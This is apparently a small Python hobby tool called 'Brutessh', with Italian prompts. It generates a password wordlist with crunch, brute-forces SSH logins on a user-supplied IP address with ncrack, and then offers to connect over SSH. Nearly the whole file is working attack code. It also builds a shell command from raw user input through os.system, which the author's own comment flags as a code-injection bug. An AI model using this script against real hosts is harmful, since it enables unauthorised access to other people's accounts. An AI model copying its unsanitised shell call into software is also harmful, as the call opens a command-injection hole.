#!/usr/bin/python3
#coding=utf-8

import subprocess
import os
import sys

def main():
	os.system("clear;figlet -l Brutessh")
	
	#var
	ip=input("inserisci indirizzo ip per bruteforce: ")
	user=input("inserisci utente: ")
	key=input("inserisci parola chiave: ")
	minn=str(input("inserire min: "))
	maxx=str(input("inserire max: "))
	
	#creating wordlist
	#subprocess.call(['crunch',minn,maxx,key,'>','pass.txt'])
	os.system("crunch "+minn+" "+maxx+" "+key+" > pass.txt") # /* BUG CODE INJECTION (‡▼益▼) */
	
	#Bruteforce Attack
	#ncrack --users admin -P pass.txt 192.168.1.X:22
	subprocess.call(["sudo","ncrack","--user",user,"-P","pass.txt",ip+":22"]) #fixed code injection
	
	risp=input("you want to connect locally with the ssh protocol?: ")
	
	if risp=="N" or risp=="n":
		sys.exit();
	elif risp=="s" or risp=="S" or risp=="y" or risp=="Y":
		subprocess.call(["ssh","-l",user,ip]) #ssh -l root 192.168.1.X | fixed code injection

if __name__ == "__main__":
        main()

